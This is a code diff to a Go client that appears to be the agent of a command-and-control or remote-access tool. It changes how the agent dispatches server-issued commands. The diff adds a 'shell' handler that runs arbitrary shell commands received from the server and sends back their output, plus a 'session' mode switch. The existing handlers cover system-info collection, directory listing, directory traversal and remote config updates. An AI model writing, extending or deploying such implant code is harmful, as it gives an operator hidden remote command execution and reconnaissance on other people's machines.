@@ -12,47 +12,79 @@ import (
 	"src/Client/generic/logger"
 )
 
-// executeCommand dispatches a single command to the appropriate handler and returns its report.
-func executeCommand(command httpFuncs.CommandData) httpFuncs.CommandReport {
+// executeCommand dispatches a single command to the appropriate handler and returns its report and a bool on whether
+// to switch to session mode.
+func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, bool) {
 	if command.Command == "" || command.CommandUUID == "" {
 		logger.Error("Invalid command format received (empty command or uuid).")
 		return httpFuncs.CommandReport{
 			Output:      "Error: Invalid command format from server.",
 			CommandUUID: command.CommandUUID,
-		}
+		}, false
 	}
-
 	var commandData string
-	if err := json.Unmarshal(command.Data, &commandData); err != nil {
-		logger.Error(fmt.Sprintf("Failed to unmarshal path from command data: %v. Data: %s", err, string(command.Data)))
 
-		return httpFuncs.CommandReport{
-			Output:      "Error: Malformed command data.",
-			CommandUUID: command.CommandUUID}
+	if command.Command != "update" {
+		if err := json.Unmarshal(command.Data, &commandData); err != nil {
+			logger.Error(fmt.Sprintf("Failed to unmarshal path from command data: %v. Data: %s", err, string(command.Data)))
+
+			return httpFuncs.CommandReport{
+				Output:      "Error: Malformed command data.",
+				CommandUUID: command.CommandUUID}, false
+		}
 	}
 
 	logger.Log(fmt.Sprintf("Executing command: '%s' (uuid: %s)", command.Command, command.CommandUUID))
 	var outputMsg string
 
-	switch command.Command {
-	case "update":
-		logger.Log("Processing 'update' command.")
-		outputMsg = handleUpdateCommand(command.Data)
-	case "systeminfo":
-		logger.Log("Processing 'systemInfo' command.")
-		outputMsg = commands.SysInfoString()
-	case "list_dir":
-		logger.Log("Processing 'listDirectory' command.")
-		outputMsg = commands.DirOutputAsString(commandData)
-	case "directory_traversal":
-		logger.Log("Running a dir traversal")
-		outputMsg = commands.DirectoryTraversal(commandData)
-	default:
+	// Define a map of command handlers for easier extensibility.
+	type commandHandlerFunc func(httpFuncs.CommandData, string) (string, bool)
+	handlers := map[string]commandHandlerFunc{
+		"session": func(cmd httpFuncs.CommandData, data string) (string, bool) {
+			logger.Log("switching to 'session' mode")
+			return "ack", true
+		},
+		"update": func(cmd httpFuncs.CommandData, data string) (string, bool) {
+			logger.Log("Processing 'update' command.")
+			return handleUpdateCommand(cmd.Data), false
+		},
+		"systeminfo": func(cmd httpFuncs.CommandData, data string) (string, bool) {
+			logger.Log("Processing 'systemInfo' command.")
+			return commands.SysInfoString(), false
+		},
+		"list_dir": func(cmd httpFuncs.CommandData, data string) (string, bool) {
+			logger.Log("Processing 'listDirectory' command.")
+			return commands.DirOutputAsString(data), false
+		},
+		"directory_traversal": func(cmd httpFuncs.CommandData, data string) (string, bool) {
+			logger.Log("Running a dir traversal")
+			return commands.DirectoryTraversal(data), false
+		},
+		"shell": func(cmd httpFuncs.CommandData, data string) (string, bool) {
+			logger.Log("Processing 'shell' command.")
+			if data == "" {
+				logger.Error("Shell command received with empty data.")
+				return "Error: No shell command provided.", false
+			}
+			output, err := commands.RunShellCommand(data)
+			if err != nil {
+				logger.Error(fmt.Sprintf("Shell command execution failed: %v", err))
+				return "Error: " + err.Error(), false
+			}
+			logger.Log(fmt.Sprintf("Shell command executed successfully: %s", output))
+			return output, false
+		},
+	}
+	var switchSession bool
+	handler, exists := handlers[command.Command]
+	if exists {
+		outputMsg, switchSession = handler(command, commandData)
+	} else {
 		logger.Log(fmt.Sprintf("Processing generic command: '%s'", command.Command))
 		outputMsg = handleGenericCommand(command)
 	}
 
-	return httpFuncs.CommandReport{Output: outputMsg, CommandUUID: command.CommandUUID}
+	return httpFuncs.CommandReport{Output: outputMsg, CommandUUID: command.CommandUUID}, switchSession
 }
 
 // handleUpdateCommand processes the 'update' command, modifying the agent's config.
